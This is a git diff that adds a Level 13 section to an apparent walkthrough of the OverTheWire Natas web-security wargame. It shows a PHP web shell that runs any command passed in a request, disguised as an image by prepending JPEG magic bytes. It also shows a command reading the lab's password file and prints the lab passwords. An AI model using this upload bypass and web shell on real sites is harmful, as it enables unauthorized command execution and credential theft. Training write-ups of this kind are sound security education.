@@ -755,3 +755,73 @@ Like:
 So our command will be the always loyal `cat /etc/natas_webpass/natas13`, 
 running `http://natas12.natas.labs.overthewire.org/upload/6jhtalz54t.php?cmd=cat /etc/natas_webpass/natas13` will get you the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`!
 
+# Level 13
+
+This challenge is the same as before however we see `For security reasons, we now only accept image files!`
+
+Let's look into the source code:
+
+```php
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+}
+```
+
+This part changed and we can see `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` is now if the file is an image (just like they said).
+So we need to make our PHP script pretend it is an image.
+
+> Use your favorite way to edit byte arrays, Python, Hex Editors, Jumper Cables, etc
+
+Breaking down our script into bytes we get:
+
+```
+3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+```
+
+In order to add the `.jpg` magic numbers we add four characters to the beginning.
+
+```php
+....<?php echo passthru($_REQUEST["cmd"]); ?>
+```
+
+Which broken into bytes is:
+
+```
+2E 2E 2E 2E 3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+```
+
+Now, we need to edit the first bytes to be `FF D8 FF DB`, getting us:
+
+```
+FF D8 FF DB 3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+```
+
+Let's test if our script works! We can do it using `file` on Linux
+
+```bash
+$ file script.php
+script.php: JPEG image data
+```
+
+We got it! Time to upload the script repeating the same process as Level 12. Edit the HTML so the file will get uploaded as `.php` and repeat the process!
+
+We get `����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`, removing the first 4 bytes we get the password!
